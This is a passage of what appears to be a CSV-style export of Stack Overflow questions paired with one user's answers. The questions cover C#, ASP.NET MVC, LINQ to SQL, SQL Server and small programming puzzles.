","33708","Mehrdad Afshari","<p>The first one would work pretty well for simple lists, but what if the list contained a nested list itself?! What if an element had a couple different lists? To keep things consistent I prefer an element for the list and using an <code>&lt;item&gt;</code> tag or something for child data. This will help using a generic function to parse all lists.</p>
"
"<p>So I came across some code this morning that looked like this:</p>

<pre><code>try
{
    x = SomeThingDangerous();
    return x;
}
catch (Exception ex)
{
    throw new DangerousException(ex);
}
finally
{
    CleanUpDangerousStuff();
}
</code></pre>

<p>Now this code compiles fine and works as it should, but it just doesn't feel right to return from within a try block, especially if there's an associated finally.</p>

<p>My main issue is what happens if the finally throws an exception of it's own? You've got a returned variable but also an exception to deal with... so I'm interested to know what others think about returning from within a try block?</p>
","33708","Mehrdad Afshari","<p>No, it's not a bad practice. Putting <code>return</code> where it makes sense improves readability and maintainability and makes your code simpler to understand. You shouldn't care as <code>finally</code> block will get executed if a <code>return</code> statement is encountered.</p>
"
"<p>I am using a Gridview to display some data. In EditItemTemplate of gridview I am using DropDownList for one of the column of gridview. DataSource of gridview is a table ""UserEntries"". And Datasource of Dropdown is another table ""TypeEntries"". Columns of TypeEntries are - Guid and TypeName. Guid is DataValueField of dropdown and TypeName is DataTextField. I am storing DataValueFiels of dropdown in UserEntries table.</p>

<p>Now when user clicks Edit button of gridview, how to populate dropdown with ""TypeEntries"" table? I am using </p>

<pre><code>    Dropdownlist tempddl = new Dropdownlist();
    tempddl = (Dropdownlist)gvUserData.FindControl(""ddlTypeListInGrid"");
    tempddl.DataSource = _section.GetTypeEntries();
    tempddl.DataBind();
</code></pre>

<p>but it is not working. Can anyone tell me any other way to do this task?
Thanks in advance.</p>
","33708","Mehrdad Afshari","<p>C# is case sensitive, you should use <code>DropDownList</code> instead.</p>
"
"<p>F# keyword '<strong>Some</strong>' - what does it mean? </p>
","33708","Mehrdad Afshari","<p><code>Some</code> is not a keyword. There is an <code>option</code> type however, which is a discriminated union containing two things:</p>

<ol>
<li><code>Some</code> which holds a value of some type.</li>
<li><code>None</code> which represents lack of value.</li>
</ol>

<p>It's defined as:</p>

<pre><code>type 'a option =
    | None
    | Some of 'a
</code></pre>

<p>It acts kind of like a nullable type, where you want to have an object which can hold a value of some type or have no value at all.</p>

<pre><code>let stringRepresentationOfSomeObject (x : 'a option) =
    match x with
    | None -&gt; ""NONE!""
    | Some(t) -&gt; t.ToString()
</code></pre>
"
"<p>Is there a way I can upload a file to my web server to test whether .net 3.5 SP1 was installed properly?</p>

<p>Maybe use a new feature or something?</p>
","33708","Mehrdad Afshari","<p>Add this to <code>Web.config</code> file and see if the assembly exists:</p>

<pre><code>&lt;add assembly=""System.Web.Abstractions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35""/&gt;
</code></pre>
"
"<p>I have a class, that wrapps a Stream instance, so I can use it for wrapping FileStreams and NetworkStreams. Now, I want to test if the stream is still delivering any data, in other words, I want to test the NetworkStream if it is still connected or the FileStream if it reached its end.</p>

<p>Is there any function whose return value I can use to determine if the next Stream.Read() will cause an exception?</p>

<p>Thanks in advance.</p>
","33708","Mehrdad Afshari","<pre><code>stream.CanRead
</code></pre>
"
"<p>Writing my first Linq application, and I'm trying to find the best way to do the following:</p>

<p>I want to load the entire employees table at once to populate the cache (used for form autocomplete).  </p>

<p>I can do -</p>

<pre><code>var query = from employee in db.Employees select employee;
foreach (Employee e in query)
{
    ...
}
</code></pre>

<p>But since this is deferred loading, it generates one query per employee.  How can I eager load the entire table?</p>

<p>I've looked into <code>DataLoadOptions</code> but that seems to only work for relationships.</p>
","33708","Mehrdad Afshari","<pre><code>var query = db.Employees.ToList();
</code></pre>

<p>By the way, this is equivalent to:</p>

<pre><code>var query = (from employee in db.Employees select employee).ToList();
</code></pre>

<p>There's no reason to force yourself to use query operators syntax when lambda syntax makes more sense and is shorter.</p>

<p><i>Side note 1</i>: The type of <code>query</code> object will be <code>List&lt;Employee&gt;</code>, however, there is no difference it terms of generated IL and performance if we explicitly specified it.</p>

<p><i>Side note 2</i>: It's important to know the query specified in the question <b>is <i>not</i> executed once per employee</b>. It's executed just once and is fetched one by one from database (similar to a <code>SqlDataReader</code> object running a <code>SELECT * FROM Employees</code> query). However, <code>ToList()</code> loads all rows in a list making further queries going to that object get executed at the application itself, not SQL Server.</p>
"
"<p>Here is the scenario:  I have two asp pages.  a.aspx is layout and b.aspx is content. I want to display the contents of b.aspx inside a <code>&lt;div&gt;</code> on a.aspx.  I know with PHP you can do it like so:</p>

<pre><code>//a.php
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;test&lt;/title&gt;
   &lt;/head&gt;
   &lt;body&gt;
      &lt;?PHP
         include ""b.php"";
      ?&gt;
   &lt;/body&gt;
&lt;/html&gt;

//b.php
&lt;?PHP
   echo ""Content String"";
?&gt;

//result
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;test&lt;/title&gt;
   &lt;/head&gt;
   &lt;body&gt;
      Content String
   &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Thanks!</p>
","33708","Mehrdad Afshari","<p>Probably <code>Server.Execute</code> will help.</p>

<pre><code>//a.aspx
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;test&lt;/title&gt;
   &lt;/head&gt;
   &lt;body&gt;
      &lt;% Server.Execute(""b.aspx""); %&gt;
   &lt;/body&gt;
&lt;/html&gt;

//b.aspx
   Content String

//result
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;test&lt;/title&gt;
   &lt;/head&gt;
   &lt;body&gt;
      Content String
   &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>By the way, I do <b>not</b> recommend this approach. It's just to show it can be done. Master pages and user controls are normally the way to go.</p>
"
"<p>Working inside the context of an ASP.NET application I am creating a page that will be able to execute database scripts against one of many databases in our environment.  To do this we need to prompt the user for a username/password combination, this value can be used for all servers without issue.</p>

<p>The question is where is the most secure location to store this information?  We need to store it temporarily as when they are on this specific page they could be executing hundreds of scripts, over multiple postbacks.  From what I can tell I have 3 options and I'm not sure what is the best.  Below is my take on the options, what is the recommendation of everyone here?  What is the most secure, while still being friendly for the user?</p>

<p><strong>Store Information In Viewstate</strong></p>

<p>One of the first ideas we discussed was storing the information after being supplied by the user in the ViewState for the page.  This is helpful as the information will only exist for the lifetime of the page, however, we are unsure of the security implications.</p>

<p><strong>Store information in Session</strong></p>

<p>The next idea we had was to store it in session, however, the downside to this is that the information can be made available to other pages inside the application, and the information always lingers in memory on the server.</p>

<p><strong>Store Information in Application</strong></p>

<p>The last idea that we had was to store it in the Application cache, with a user specific key and a sliding 5 minute expiration.  This would still be available to other pages, however, it would ensure that the information is cached for a shorter period.</p>

<p><strong>Why?</strong></p>

<p>The final question that is important is ""Why are you doing this?"".  Why don't we just use their Lan id's?  Well we cannot use lan id's due to the lack of network support for delegation.</p>

<p>S0 what is the recommended solution?  Why?  How secure is it, and can we be?</p>

<p><em>Update</em></p>

<p>Great information has been discussed.  TO clarify, we are running in an intranet environment, we CANNOT use Impersonation or Delegation due to limitations in the network.  </p>
","33708","Mehrdad Afshari","<p>The <code>ViewState</code> approach is good but has the problem that you are giving out the username and password to the client. Even if you encrypt it, if some attacker has the encryption key, the situation will not be very good.</p>

<p>Regarding the <code>Session</code> and <code>Application</code> approaches, I don't think <code>Application</code> approach makes sense. Data is user specific, so <code>Session</code> should be the way to go. It'll go away as soon as user's session is closed. By the way, if you chose to store it at the server, use <code>SecureString</code> class.</p>
"
"<p>I want to convert windows pathname to unique integer. </p>

<p>Eg:</p>

<p>For pathname C:\temp\a.out, if i add ascii value of all the characters, i get 1234. But some other path can also generate the same number. So, what is the best way to generate unique numbers for different pathnames?</p>
","33708","Mehrdad Afshari","<p><a href=""http://en.wikipedia.org/wiki/Perfect_hash_function"" rel=""nofollow"">Perfect hashing</a></p>
"
"<p>Can SQL Server 2000 be used as the database for LINQ to SQL?</p>

<p>Does LINQ to SQL rely on a specific version of Microsoft SQL Server?</p>
","33708","Mehrdad Afshari","<p>Yes, you can.</p>

<p>LINQ to SQL adapts the generated queries to work with 2000.</p>
"
"<p>I've this sample program of a step that I want to implement on my application. I want to push_back the int elements on the string separately, into a vector. How can I? </p>

<pre><code>#include &lt;iostream&gt;
#include &lt;sstream&gt;

#include &lt;vector&gt;

using namespace std;

int main(){

    string line = ""1 2 3 4 5""; //includes spaces
    stringstream lineStream(line);


    vector&lt;int&gt; numbers; // how do I push_back the numbers (separately) here?
    // in this example I know the size of my string but in my application I won't


    }
</code></pre>
","33708","Mehrdad Afshari","<pre><code>int num;
while (lineStream &gt;&gt; num) numbers.push_back(num);
</code></pre>
"
"<p>I am developing a winforms MDI application in C# in VS 2008.
I have noticed that the MDI forms don't have the glass look under Vista.</p>

<p>Is this by design?
Is there a simple way to get the glass look for these windows?</p>
","33708","Mehrdad Afshari","<p>Nope, Glass is not available for MDI children.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/78696/vista-uac-access-elevation-and-net"">Vista UAC, Access Elevation and .Net</a>  </p>
</blockquote>



<p>I have a special feature in my AP, this feature need to get administrator right in Vista. Is there any MS API to pop up the UAC dialog when I click the button? Because I donât want the end-user to see UAC dialog during startup, the feature is really special, not every user will do that. Thanks in advance.</p>
","33708","Mehrdad Afshari","<p>Nope, MS has spent lots of time to make programmatic access to that button impossible! If you could do such a thing, UAC would be absolutely useless. You might encapsulate the functionality as a something (e.g. a Windows service) running with admin privileges. on which you'll call a method from the non-elevated process.</p>
"
"<p>I have this function...</p>

<pre><code>private string dateConvert(string datDate)
{
        System.Globalization.CultureInfo cultEnGb = new System.Globalization.CultureInfo(""en-GB"");
        System.Globalization.CultureInfo cultEnUs = new System.Globalization.CultureInfo(""en-US"");

        DateTime dtGb = Convert.ToDateTime(datDate, cultEnGb.DateTimeFormat);
        datDate = dtGb.ToString(cultEnUs.DateTimeFormat.ShortDatePattern);

        return datDate;
}
</code></pre>

<p>But I want it with the leading zero still on lower digits (1-9) so the date is 11-09-2009 (mm-dd-yyyy)...</p>

<p>Now If I wasn't converting it id use string.Format(""{0:d}"", dateVar) how do I do this in the conversion?</p>

<p><b><strong><em></strong> Solution <strong></em></strong></b><br><br>
Used a slightly modified version of the answer below (i.e. one that would render).</p>

<pre><code>Convert.ToDateTime(datDate).ToString(""MM-dd-yyyy"");
</code></pre>
","33708","Mehrdad Afshari","<pre><code>return dateTimeValue.ToString(""MM-dd-yyyy"");
</code></pre>
"
"<p>I am automating some profiling tasks and want to log heap space and generation sizes real-time.  The <a href=""http://msdn.microsoft.com/en-us/library/bb384547.aspx"">profiling API</a> seems awfully complicated for what I need, and it seems to listen in on individual allocations and collections, which isn't that important to me.  Profiling tools are a great help of course, but I was looking for a more flexible, programmable interface.</p>
","33708","Mehrdad Afshari","<p>The term 'current memory usage' is a little loosely defined. Do you mean the working set? Whatever it means, you can use different properties such as <code>VirtualMemorySize</code>, <code>WorkingSet</code>, <code>PrivateMemorySize</code>, etc. from the process class to retrieve it.</p>

<pre><code>long workingSet = System.Diagnostics.Process.GetCurrentProcess().WorkingSet64;
</code></pre>
"
"<pre><code>void foo(void **Pointer);

int main ()
{
    int *IntPtr;

    foo(&amp;((void*)IntPtr));
}
</code></pre>

<p>Why do I get an error?</p>

<pre><code>error: lvalue required as unary â&amp;â operand
</code></pre>

<p>Thanks</p>
","33708","Mehrdad Afshari","<pre><code>void foo(void **Pointer);

int main ()
{
    int *IntPtr;

    foo((void**)&amp;IntPtr);
}
</code></pre>
"
"<p>I have a list of values like this</p>

<pre><code>1000, 20400
22200, 24444
</code></pre>

<p>The ranges don't overlap.</p>

<p>What I want to do is have a c# function that can store (loaded values from db then cache it locally) a relatively large list of these values then have a method for finding if a supplied value is in any of the ranges?</p>

<p>Does this make sense?</p>

<p>Need the quickest solution</p>
","33708","Mehrdad Afshari","<pre><code>class Range
{
   public int Start { get; set; }
   public int End { get; set; }

   static Dictionary&lt;int, Range&gt; values;
   static int[] arrToBinarySearchIn;
   public static void BuildRanges(IEnumerable&lt;Range&gt; ranges) { 
        values = new Dictionary&lt;int, Range&gt;();
        foreach (var item in ranges)
            values[item.Start] = item;
        arrToBinarySearchIn = values.Keys.ToArray();
        Array.Sort(arrToBinarySearchIn);
   }
   public static Range GetRange(int value)
   {
       int searchIndex = Array.BinarySearch(arrToBinarySearchIn, value);
       if (searchIndex &lt; 0)
           searchIndex = ~searchIndex - 1;
       if (searchIndex &lt; 0)
           return null;
       Range proposedRange = values[arrToBinarySearchIn[searchIndex]];
       if (proposedRange.End &gt;= value)
           return proposedRange;
       return null;
   }
}
</code></pre>
"
"<p>I know I can ""SELECT 5 AS foo"" and get the resultset:</p>

<blockquote>
  <p><strong>foo</strong></p>
  
  <p>5</p>
  
  <p>(1 row)</p>
</blockquote>

<p>...is there any way to ""SELECT 5,6,7 AS foo"" and get the resultset:</p>

<blockquote>
  <p><strong>foo</strong></p>
  
  <p>5</p>
  
  <p>6</p>
  
  <p>7</p>
  
  <p>(3 rows)</p>
</blockquote>

<p>...I'm well aware that this is not typical DB usage, and any conceivable usage of this is probably better off going w/ a more ordinary technique.  More of a technical question.</p>

<p><em>Note: I know I could use a big gross list of UNIONs -- I'm trying to find something else.</em></p>
","33708","Mehrdad Afshari","<pre><code>select foo
from (select 1 as n1, 2 as n2, 3 as n3) bar
unpivot (foo for x in (n1, n2, n3)) baz;
</code></pre>
"
"<p>Is there a way to have a statement across multiple lines without the underscore character?</p>

<p>It is really annoying in multi-line strings such as SQL statements, and especially <a href=""http://en.wikipedia.org/wiki/Language_Integrated_Query"" rel=""nofollow"">LINQ</a> queries.</p>

<p>Beside from the ugliness and difficulty when changing a line (nothing lines up anymore), you can't use comments in the middle of the multi-line statement.</p>

<p>Examples of my daily personal hell.</p>

<pre><code>dim results = from a in articles _
              where a.articleID = 4 _ ' articleID     - Nope, can't do this
              select a.articleName


dim createArticle as string = _
    ""Create table article "" &amp; _
    ""    (articleID int "" &amp; _
    ""    ,articleName varchar(50) "" &amp; _
    ""    )""
</code></pre>
","33708","Mehrdad Afshari","<p>VB uses line break as the statement terminator. There is no way to change it (it's like asking C# not to expect ; at the end of statements). There is a solution however, you can always switch to C#!</p>
"
"<p>I'm looking for a function that will convert a standard IPv4 address into an Integer.  Bonus points available for a function that will do the opposite.</p>

<p>Solution should be in C#.</p>
","33708","Mehrdad Afshari","<pre><code>// IPv4
int intAddress = BitConverter.ToInt32(IPAddress.Parse(address).GetAddressBytes(), 0);
string ipAddress = new IPAddress(BitConverter.GetBytes(intAddress)).ToString();
</code></pre>

<p>EDIT: As noted in other answers, when running this snippet on a little endian machine, it'll give out the bytes in the reverse order as defined by the standard. However, the question asks for a mapping between an integer and an IP address, not converting to the standard integer format. To do so, you have to consider the endian-ness of the machine you're running on.</p>
"
"<p>I'm building a PC with the new Intel I7 quad core processor. With hyperthreading turned on it will report 8 cores in Task Manager.</p>

<p>Some of my colleagues are saying that hyperthreading will make the system unreliable and suggest turning it off.</p>

<p>Can any of you good people enlighten me and the rest of the stockoverflow users.</p>

<blockquote>
  <p>Follow on: I've been using hyperthreading constantly, and its been spot on. No instability whatsoever. I'm using:</p>
</blockquote>

<ul>
<li>Microsoft Server 2008 64 bit</li>
<li>Microsoft SQL Server 2008 64 bit</li>
<li>Microsoft Visual Studio 2008</li>
<li>Diskeeper Server</li>
<li>Lots of controls (Telerik, Dundas, Rebex, Resharper)</li>
</ul>
","33708","Mehrdad Afshari","<p>Unreliable? I doubt so. The only disadvantage of hyperthreading that I can think of is the fact that <b>if the OS is not aware of it</b>, it might schedule two threads on one physical processor when other physical processors are idle which will degrade performance.</p>
"
"<p>I have to check a number if it satisfies the following criteria:</p>

<ul>
<li>in binary, all one-bits must be successive.</li>
<li>the number must have at least one bit set. </li>
<li>the successive one-bits may start at the MSB or end at the LSB, so it's perfectly valid if the number is made up of a single one-bit stream followed by a zero-bit stream or vice versa. </li>
</ul>

<p>I wrote a code that checks for these conditions for a real-world problem (checking data-file integrity). </p>

<p>It works without problems and it's anything but time-critical, but I'm an old bit-twiddeling freak and love such puzzles, so I've tried to came up with a more clever way to check for single-one-bit streams. </p>

<p>Cases where the string is surrounded by zeros is easy, but that one can't deal with the special cases. </p>

<p><strong>Any ideas, binary hacks and partial solutions are welcome!</strong></p>

<p><hr /></p>

<p>To make my requirements more clear some examples: The following numbers satisfy my criteria:</p>

<pre><code>  0x80000000
  0x00000001
  0xff000000
  0x000000ff
  0xffffffff
  0x000ff000
</code></pre>

<p>The following numbers don't (as they have more than one successive string of ones):</p>

<pre><code>  0xf00000f &lt;- one-bit streams should not wrap-around at 2^n
  0x0001700 &lt;- a trivial example.
  0x0000000 &lt;- no one bit at all.
</code></pre>
","33708","Mehrdad Afshari","<pre><code>bool isOK(uint val) {
   while (val != 0 &amp;&amp; (val &amp; 1u) == 0) val &gt;&gt;= 1;
   if (val == 0) return false;
   while (val != 0 &amp;&amp; (val &amp; 1u) == 1) val &gt;&gt;= 1;
   return val == 0;
}

; x86 assembly
mov eax, THE_NUMBER ; store the number in eax
bsf ecx, eax
jz .notok
mov edi, 1
shl edi, cl
mov esi, eax
add esi, edi
test esi, eax
jnz .notok
mov eax, 1
jmp .end
.notok:
mov eax, 0
.end: ; eax = 1 if satisfies the criteria, otherwise it's 0
</code></pre>
"
"<p>I can get a list of running threads from Process.GetCurrentProcess().Threads, but I need to know the managed name of threads started with Thread.Start. It isn't a property on the ProcessThread object though. Is there a way to get this information from a ProcessThread?</p>
","33708","Mehrdad Afshari","<p>While CLR spawns an OS thread for each managed thread, it's not forced to. I mean, no standard guarantees that there should be a one to one mapping between OS threads and managed threads.</p>

<p>To quote MSDN:</p>

<blockquote>
  <p>An operating-system ThreadId has no
  fixed relationship to a managed
  thread, because an unmanaged host can
  control the relationship between
  managed and unmanaged threads.
  Specifically, a sophisticated host can
  use the CLR Hosting API to schedule
  many managed threads against the same
  operating system thread, or to move a
  managed thread between different
  operating system threads.</p>
</blockquote>
"
"<p>I've been experimenting with ASP.NET MVC and following <a href=""http://www.asp.net/learn/mvc/tutorial-01-cs.aspx"" rel=""nofollow"">this</a> tutorial to create the basic task list application. I've gotten it running fine, everything is working although the video is in VB and I had some trouble getting it ""converted"" to C# but muddled through thanks to the codesample.</p>

<p>Now, to further my knowledge I've decided to make a small modification to the system. I want to change the Index page so as to display ""My Tasks"" in red if all tasks are complete, and ""My Tasks"" in green if there are <em>any</em> incomplete tasks.</p>

<p>I've added the following function to HomeController.cs:</p>

<pre><code>    public bool Uncomplete()
    {
        bool AnyLeft = false;
        var tasks = from t in db.Tasks orderby t.EntryDate descending select t;
        foreach (Task match in tasks)
        {
            if (match.IsCompleted == false)
            {
                AnyLeft = true;
            }
        }

        return AnyLeft;
    }
</code></pre>

<p>I then modified the Index() ActionResult to look like this:</p>

<pre><code>    public ActionResult Index()
    {
        bool AnyLeft = Uncomplete();
        var tasks = from t in db.Tasks orderby t.EntryDate descending select t;
        return View(tasks.ToList());
    }
</code></pre>

<p>With my final intent to use the following code in Index.aspx:</p>

<pre><code>&lt;% if (AnyLeft == false)
   { %&gt;
    &lt;h1 class=""green""&gt;My Tasks&lt;/h1&gt;
&lt;% }
   else
   { %&gt;
    &lt;h1 class=""red""&gt;My Tasks&lt;/h1&gt;
&lt;% } %&gt;
</code></pre>

<p>However, I can't figure out how to make Index.aspx ""aware"" of AnyLeft having a value of true or false. I tried</p>

<pre><code>return View(tasks.ToList(), AnyLeft);
</code></pre>

<p>But that throws errors that I can't quite decipher. I have a feeling I'm going about things ""the wrong way"" but I can't figure it out.</p>
","33708","Mehrdad Afshari","<p>Use this in the controller:</p>

<pre><code>public ActionResult Index()
{
    ViewData[""AnyLeft""] = Uncomplete();
    var tasks = from t in db.Tasks orderby t.EntryDate descending select t;
    return View(tasks.ToList());
}
</code></pre>

<p>And in the view:</p>

<pre><code>&lt;% if (!(bool)ViewData[""AnyLeft""])
   { %&gt;
    &lt;h1 class=""green""&gt;My Tasks&lt;/h1&gt;
&lt;% }
   else
   { %&gt;
    &lt;h1 class=""red""&gt;My Tasks&lt;/h1&gt;
&lt;% } %&gt;
</code></pre>
"
"<p>I'm trying to persist an XML file to disk using LINQ. I have a class of business objects including collections of strings (List) that I want to convert into XML. Is there a simple, one liner to convert this list into a list of XML Elements?</p>

<p>For example, my list may be:</p>

<pre><code>List&lt;string&gt; collection = new List&lt;string&gt;() {""1"", ""2"", ""3""}
</code></pre>

<p>The output should be:</p>

<pre><code>&lt;Collection&gt;
     &lt;Element&gt;1&lt;/Element&gt;
     &lt;Element&gt;2&lt;/Element&gt;
     &lt;Element&gt;3&lt;/Element&gt;
&lt;/Collection&gt;
</code></pre>

<p>At the moment, I'm using this sort of syntax:</p>

<pre><code>XElement Configuration =
    new XElement(""Configuration"",
    new XElement(""Collection"",  collection.ToArray()
    ),
);
</code></pre>

<p>However, this concatenates the collection into a a single string element.</p>
","33708","Mehrdad Afshari","<pre><code>XElement Configuration = new XElement(""Collection"",
      collection.Select(c=&gt;new XElement(""Element"", c)));
</code></pre>
"
"<p>I want to write a console or Click Once WinForms app that will programmatically stop and/or start a windows service on a remote box.</p>

<p>Both boxes are running .NET 3.5 - what .NET API's are available to accomplish this?</p>
","33708","Mehrdad Afshari","<p>You can use <code>System.Management</code> APIs (WMI) to control services remotely. WMI is the generic API to do administrative tasks.</p>

<p>For this problem, however, I suggest you to use the easier to use <code>System.ServiceProcess.ServiceController</code> class.</p>
"
"<p>I am working on an ASP.NET MVC Project and I have a number of node snippets that I need to insert into multiple pages. I would very much like to know whether or not it is possible to have a snippet of code that can be placed in an external file and called from within a ViewPage. In a way this would be similar to calling a class from a class.cs file. </p>

<p>Here is an example snippet of code:</p>

<pre><code>&lt;% Amazon.ECS.Model.Cart leftCart = ViewData[""leftCart""] as Amazon.ECS.Model.Cart %&gt;
&lt;strong&gt;Total: &lt;/strong&gt;
&lt;%= leftCart.SubTotal.FormattedPrice%&gt;&lt;br /&gt;
&lt;strong&gt;Items: &lt;/strong&gt;
&lt;%= leftCart.CartItems.CartItem.Count%&gt;
&lt;center&gt;
&lt;a href=""&lt;%= leftCart.PurchaseURL %&gt;""&gt;
&lt;img style=""float: right; margin-top: 20px;"" src=""/../../Content/Images/checkout.gif""
/&gt;&lt;/a&gt;&lt;/center&gt;
</code></pre>

<p>Is it possible?   </p>
","33708","Mehrdad Afshari","<p>You can use view user controls. They are essentially <code>ascx</code> files and behave roughly the same as their Web forms counterparts. The primary difference is that they inherit from <code>System.Web.Mvc.ViewUserControl</code> instead of <code>System.Web.UI.UserControl</code>.</p>

<p>You can either embed them using <code>&lt;% @Register %&gt;</code> tags and <code>&lt;prefix:Name runat=""server"" /&gt;</code> or using <code>Html.RenderPartial</code> method.</p>
"
"<p>If I'm not mistaken - the conventions of ASP.NET MVC seem to want me to do the following for a controller view.</p>

<p>Thats to day I create 'Products' directory into which I place my 'Index' view. I then create a 'ProductsController' and create an 'Index' method on it which returns a View. Returning just View() with no arguments will go and fetch the 'Index.aspx' page because its the same name as the method.</p>

<pre><code> public class ProductsController : Controller
    {
        public ActionResult Index()
        {
            return View();   // looks for Index.aspx in Products directory
        }
    }
</code></pre>

<p>Now thats just fine. BUT I'll end up with a billion Index.aspx pages, and I'm one of these people that never closes any files so I'll end up going crazy.</p>

<p>Alternatively I can create Products/Products.aspx and change my controller to the following :</p>

<pre><code> public class ProductsController : Controller
    {
        public ActionResult Index()  // my default routing goes to Index (from sample project)
        {
            return View(""Products"");
        }
    }
</code></pre>

<p>I understand how that works, and that its completely fine within the MVC design pattern to do this. Its not a hack or anything like that.</p>

<p>My problem (after listening to <a href=""http://channel9.msdn.com/pdc2008/PC21/"" rel=""nofollow"">this</a> PDC video) is that convention over customizabiltity is favored in MVC (or whatever the correct phrase is).</p>

<p>So I'm wondering if I'm missing a third way, or if people are just fine with 50 Index tabs in Visual Studio?</p>
","33708","Mehrdad Afshari","<p>I think you should name the method after the action and name the view (if it makes sense and it's not shared between actions, the same as the action). You should probably change your routing mechanism as <code>Index</code> isn't really a descriptive name. The action name should represent what it does (just like any method) and shouldn't be hardcoded to <code>Index</code> or something like that. Routing should be edited instead.</p>
"
"<p>What exactly do I need delegates, and threads for?</p>
","33708","Mehrdad Afshari","<p><a href=""http://msdn.microsoft.com/en-us/library/ms173171(VS.80).aspx"">Delegates</a>: Basically, a  delegate is a method to reference a method. It's like a pointer to a method which you can set it to different methods that match its signature and use it to pass the reference to that method around.</p>

<p><a href=""http://en.wikipedia.org/wiki/Thread_(computer_science)"">Thread</a> is a sequentual stream of instructions that execute one after another to complete a computation. You can have different threads running simultaneously to accomplish a specific task. A thread runs on a single logical processor.</p>
"
"<p>I have multiple lists of strings, <code>IList&lt;string&gt;</code>, that I want to consolidate in one list showing distinct string and count for each item (like a dictionary). what is the most efficient way to do this? </p>
","33708","Mehrdad Afshari","<pre><code>Dictionary&lt;string, int&gt; count = new Dictionary&lt;string, int&gt;();

foreach(IList&lt;int&gt; list in lists)
  foreach(int item in list) {
    int value;
    if (count.TryGetValue(item, out value)) 
      count[item] = value + 1;
    else
      count[item] = 1;
  }
</code></pre>
"
"<p>We have an application written in C#, using .NET Framework 3.0 or 3.5 or something like that. As storage we use SQL Server, and we use Linq 2 SQL to talk with it. </p>

<p>Currently most (if not all) text columns in the database, are set to the varchar type (of different lengths of course).</p>

<p>But I started thinking... according to MSDN ""The string type represents a sequence of zero or more Unicode characters."" Does that mean that we should really change those columns to nvarchar for things to be stored correctly? Or how does that work? Their reasoning for setting them to varchar originally was because nvarchar requires twice as much space (if I have understood correctly). And as far as I have seen so far, it works with varchar, but we haven't done very much testing with unusal foreign characters...</p>

<p>Could someone shed some light on this?</p>
","33708","Mehrdad Afshari","<p>Yes, <code>nvarchar</code> stores characters as unicode, like a .NET string. If you need to store strings containing characters in different languages, you should probably go with <code>nvarchar</code>.</p>

<p>If you have only characters from a single language, you have another option to go with <code>varchar</code> and choose the specific collation for that language (which will save space but makes life much more complicated).</p>
"
"<p>In VB.NET <code>CINT(VB.NET) is Integer.Parse</code> in .NET Framework, what is the .NET equivalent for (VB.NET) CType?</p>
","33708","Mehrdad Afshari","<p><code>CType</code> is translated to a cast, which is a language level issue. In the emitted IL, there is no such thing as casting an <code>object</code> to a <code>string</code>, for instance. (Side note: if the type is a value type, it'll translate to an <code>unbox</code> instruction, but it's another story; The runtime does not distinguish between a reference to <code>Foo</code> and <code>Bar</code> reference types at all, for the sake of simplicity, I also ignored throwing <code>InvalidCastException</code> which is done by the <code>castclass</code> instruction).</p>

<p><code>Integer.Parse</code> and <code>CInt</code> basically do some process on the source object (the string) and convert it to an equivalent integer. They do something. <code>CType</code> just instructs the language compiler about the type conversion.</p>

<p>For the sake of completeness, the IL equivalent of casting is:</p>

<ol>
<li><code>castclass</code> if the type is a reference type.</li>
<li><code>unbox</code> if the type is a value type.</li>
</ol>

<p>However, the Visual Basic compiler, translates the expression to a call to one of the <code>Microsoft.VisualBasic.CompilerServices.Conversions</code> methods.</p>
"
"<p>Now, this might be a very newbie question, but I don't really have experience with multithreaded programming and I haven't fully understood how threads work compared to processes.</p>

<p>When a process on my machine hangs, say it's waiting for some IO that never comes or something similar, I can kill and restart it because other processes aren't affected and can, for example, still operate my terminal. This is very obvious, of course.</p>

<p>I'm not sure whether it is the same with threads inside a process: If one hangs, are the others unaffected? In other words, can I run a ""watchdog"" thread which supervises the other threads and, for example kill and recreate hanging threads? For example, if I have a threadpool that I don't want to be drained by occasional hangups.</p>
","33708","Mehrdad Afshari","<p>You didn't mention about the platform, but as far as I'm concerned, NT kernel schedules threads, not processes and threats them independently in that manner. This might not be and is not true on other platforms (some platforms, like Windows 3.1, do not use preemptive multithreading and if one thread goes in infinite loop, everything is affected).</p>
"
"<p>Does anyone know if the SqlDataAdapter.Dispose method actually closes or disposes any SqlConnections?  I loaded up Reflector and I see that SqlDataAdapter inherits from DbDataAdapter.  If I disassemble and look at the dispose method in that class, there appears to be no disposal of any SqlConnections.  I suppose I could write a test for this, but I figured I would ask to see if anyone had any insight on this.</p>
","33708","Mehrdad Afshari","<p>Nope, it doesn't dispose the connection. I believe it shouldn't. You might want to use it elsewhere.</p>
"
"<p>Just wondering if anyone knew off the top of their heads if there was much difference in doing the following:</p>

<pre><code>String wibble = ""&lt;blah&gt; blah blah &lt;/blah&gt;.... &lt;wibble&gt; blah wibble blah &lt;/wibble&gt; some more test here"";

int i = wibble.lastIndexOf(""&gt;"");
int j = wibble.lastIndexOf('&gt;');
</code></pre>
","33708","Mehrdad Afshari","<p>Performance-wise, there might be a slight difference. For searching a single character, it's faster or equal to use <code>char</code> instead of <code>String</code>.</p>
"
"<p>This is an attempt to rephrase a question I asked earlier. I'd like to know why C++ seems to be the language of choice for certain thick client apps. The easiest example I can think of is video games and my favorite app VirtualBox.</p>

<p>Please don't close this post I'm just trying to understand why this is the case.</p>
","33708","Mehrdad Afshari","<p>Primary reasons might be:</p>

<ol>
<li>Performance</li>
<li>Higher level of control over low level things</li>
<li>An existing code base</li>
</ol>
"
"<p>I was wondering what is the design motive behind extension methods in C#</p>
","33708","Mehrdad Afshari","<p>The primary reason for their existence is being able to somehow add features to a type without inheriting from it.</p>

<p>This was required to provide <code>Where</code>, <code>Select</code>, ... methods for use in LINQ for collections that didn't have one.</p>
"
"<p>I have a console application (<code>MyProgram.EXE</code>) that references a Utilities assembly.</p>

<p>In my Utilities assembly, I have code that does:</p>

<pre><code>Dim asm As Assembly = Assembly.GetExecutingAssembly()
Dim location As String = asm.Location
Dim appName As String = System.IO.Path.GetDirectoryName(location)
Conole.WriteLine(""AppName is: {0}"", appName)
</code></pre>

